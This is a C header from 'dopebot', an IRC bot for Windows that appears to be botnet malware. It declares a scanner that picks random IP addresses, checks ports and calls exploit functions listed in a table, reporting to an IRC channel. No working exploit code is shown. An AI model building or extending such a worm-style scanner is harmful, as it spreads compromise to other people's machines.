/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_SCANNER
void get_current_ip(char *szBuffer);
void get_nextip_rnd(char *szIP, char *szBuffer);
bool is_port_open(char *szIP, int iPort, int iDelay);
DWORD WINAPI scan_main(LPVOID param);
DWORD WINAPI scan_start(LPVOID param);
bool scan_stop();

typedef struct scanner
{
	char szIP[16];
	int iPort;
	char szExploit[16];
	bool bExploit;
	int iExploit;
	int iDelay;
	int iThreads;
	bool bRandom;
	SOCKET bsock;
	char szAction[32];
	char szChannel[32];
} scanner;

typedef struct exploitinfo 
{
	char szIP[16];
	int iPort;
	SOCKET bsock;
} exploitinfo;

typedef bool (*efref)(exploitinfo exinfo);

typedef struct exploits
{
	char szName[30];
	int iPort;
	efref exfunc;
} exploits;
#endif